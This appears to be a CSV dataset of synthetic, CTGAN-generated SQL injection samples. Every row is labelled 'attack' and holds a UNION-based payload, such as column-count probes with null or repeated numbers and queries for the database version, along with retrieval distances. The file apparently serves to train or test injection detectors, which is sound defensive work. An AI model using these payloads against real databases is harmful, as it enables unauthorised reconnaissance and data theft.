id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000197,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,6.846604904450783
CTGAN_000198,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,8.832080949283151
CTGAN_000199,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,6.83110784969799
CTGAN_000200,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.725562215316448
CTGAN_000201,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.7612077200577225
CTGAN_000202,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,5.415227240484657
CTGAN_000203,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.131436684484404
CTGAN_000204,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,4.9774449358702455
CTGAN_000205,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,6.332229493456634
CTGAN_000206,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,5.286663598112839
CTGAN_000207,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000075,5.070500150712192
CTGAN_000208,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,6.886889570033419
CTGAN_000209,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.897157253098205
CTGAN_000210,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,6.393480420224346
CTGAN_000211,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.791804730870164
CTGAN_000212,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,3.5640723242464674
CTGAN_000213,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,7.660801190945694
CTGAN_000214,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.006405167567155
CTGAN_000215,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,4.993478427086873
CTGAN_000216,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.35505526259698
CTGAN_000217,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,4.604624062842074
CTGAN_000218,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.436074086918151
CTGAN_000219,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,7.591946670703052
CTGAN_000220,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.382348578723754
CTGAN_000221,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,4.181925366400577
CTGAN_000222,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.508740862615309
CTGAN_000223,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,7.4030205570887855
CTGAN_000224,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000115,6.905442530810014
CTGAN_000225,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,7.010140782239811
CTGAN_000226,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.9307136120334105
CTGAN_000227,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,6.891873604224797
CTGAN_000228,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,7.331956796732371
CTGAN_000229,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,5.815912491115758
CTGAN_000230,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,4.1468967337311495
CTGAN_000231,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,5.660831667795734
CTGAN_000232,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,8.387131268951318
CTGAN_000233,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,4.540026716263482
CTGAN_000234,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.052519935522362
CTGAN_000235,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.425256239393072
CTGAN_000236,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.877156942082013
CTGAN_000237,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.818929450488284
CTGAN_000238,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,6.406459237688633
CTGAN_000239,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,7.345396671659944
CTGAN_000240,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,4.695329026400081
CTGAN_000241,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,6.382853882379309
CTGAN_000242,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,7.093248531087488
CTGAN_000243,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.823154595340703
CTGAN_000244,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.1735607965514445
CTGAN_000245,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,6.236771857162356
CTGAN_000246,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.020727594836482
CTGAN_000247,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.268413316966692
CTGAN_000248,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.274250598546445
CTGAN_000249,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.4903512725127035
CTGAN_000250,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.878764898516968
CTGAN_000251,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,4.7576565717248345
CTGAN_000252,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,5.493925475693693
CTGAN_000253,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,6.652547814472969
CTGAN_000254,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,5.311178122450221
CTGAN_000255,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.519402390729789
CTGAN_000256,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,6.677668576793744
CTGAN_000257,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,5.293940716206838
CTGAN_000258,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,6.513646974811395
CTGAN_000259,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,9.416363344594732
CTGAN_000260,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,7.329064595683995
CTGAN_000261,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,5.3989608007259555
CTGAN_000262,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,8.234985913900255
CTGAN_000263,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,5.021281803696378
CTGAN_000264,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.098554588654617
CTGAN_000265,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.64547759896497
CTGAN_000266,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,7.6767307736998145
CTGAN_000267,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,5.738259233709655
CTGAN_000268,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.526906094861542
CTGAN_000269,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,5.600305378111086
CTGAN_000270,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.551028754549116
CTGAN_000271,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.599910596313438
CTGAN_000272,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,9.551268412766273
CTGAN_000273,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,6.83460522775591
CTGAN_000274,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.476087025449331
CTGAN_000275,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,5.700557099673788
CTGAN_000276,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.455768421740791
CTGAN_000277,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,6.294494134533708
CTGAN_000278,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,8.607508892375098
CTGAN_000279,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.816123416171613
CTGAN_000280,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,4.892740585666838
CTGAN_000281,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.545122770708004
CTGAN_000282,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,6.90733625787801
CTGAN_000283,attack,union,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",nearest_attack_euclidean,R000133,5.327769322005624
CTGAN_000284,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.708417239406911
CTGAN_000285,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.364020689811182
CTGAN_000286,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,5.249161411793027
CTGAN_000287,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,7.40129666678724
CTGAN_000288,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,5.113819602564591
CTGAN_000289,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.38305919776341
CTGAN_000290,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.7525830967231935
CTGAN_000291,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.829658572541483
CTGAN_000292,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,5.581408737492479
CTGAN_000293,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,7.013201270161698
CTGAN_000294,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.784456952280135
CTGAN_000295,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.451828913076975
CTGAN_000296,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,6.95228805412056
CTGAN_000297,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.605913412264911
CTGAN_000298,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,8.086918122461238
CTGAN_000299,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,7.114395694046404
CTGAN_000300,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,6.366189439953401
